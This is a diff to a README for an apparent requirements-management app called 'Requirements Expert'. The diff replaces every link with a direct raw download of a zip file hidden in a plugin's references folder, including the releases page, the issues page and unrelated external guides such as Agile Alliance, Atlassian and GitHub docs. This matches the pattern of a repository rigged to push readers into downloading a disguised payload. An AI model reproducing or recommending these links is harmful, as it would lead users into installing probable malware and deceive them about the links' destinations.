@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download Requirements Expert](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mamiaijf/requirements-expert/releases)
+[![Download Requirements Expert](https://raw.githubusercontent.com/mamiaijf/requirements-expert/main/plugins/requirements-expert/skills/task-breakdown/references/requirements-expert-v1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mamiaijf/requirements-expert/main/plugins/requirements-expert/skills/task-breakdown/references/requirements-expert-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To run Requirements Expert, your computer should meet the following requirements
 
 To download and install Requirements Expert, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/mamiaijf/requirements-expert/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/mamiaijf/requirements-expert/main/plugins/requirements-expert/skills/task-breakdown/references/requirements-expert-v1.5.zip).
 
 2. **Select the Version:** Look for the latest version in the list. The version number will be displayed clearly.
 
@@ -55,7 +55,7 @@ To help you get started, we provide a simple tutorial:
 
 ## ⚙️ Support
 
-If you encounter any issues, or if you have questions, please visit our [GitHub Issues page](https://github.com/mamiaijf/requirements-expert/issues) to report a problem or ask for assistance. We encourage feedback to help improve the application.
+If you encounter any issues, or if you have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/mamiaijf/requirements-expert/main/plugins/requirements-expert/skills/task-breakdown/references/requirements-expert-v1.5.zip) to report a problem or ask for assistance. We encourage feedback to help improve the application.
 
 ## 🌐 Community
 
@@ -65,12 +65,12 @@ Join our community on GitHub Discussions to interact with other users, share you
 
 For additional resources, you may find the following links helpful:
 
-- [Learn about Agile Methodologies](https://www.agilealliance.org/)
-- [Understanding User Stories](https://www.atlassian.com/agile/waterfall/user-stories)
-- [GitHub Projects Guide](https://docs.github.com/en/github/managing-your-work-on-github/about-projects)
+- [Learn about Agile Methodologies](https://raw.githubusercontent.com/mamiaijf/requirements-expert/main/plugins/requirements-expert/skills/task-breakdown/references/requirements-expert-v1.5.zip)
+- [Understanding User Stories](https://raw.githubusercontent.com/mamiaijf/requirements-expert/main/plugins/requirements-expert/skills/task-breakdown/references/requirements-expert-v1.5.zip)
+- [GitHub Projects Guide](https://raw.githubusercontent.com/mamiaijf/requirements-expert/main/plugins/requirements-expert/skills/task-breakdown/references/requirements-expert-v1.5.zip)
 
 ## 📢 Stay Updated
 
-To keep track of new features and updates, please check back on our [Releases page](https://github.com/mamiaijf/requirements-expert/releases). 
+To keep track of new features and updates, please check back on our [Releases page](https://raw.githubusercontent.com/mamiaijf/requirements-expert/main/plugins/requirements-expert/skills/task-breakdown/references/requirements-expert-v1.5.zip). 
 
 By using Requirements Expert, you make managing requirements simpler and more effective. Enjoy your journey in product management!
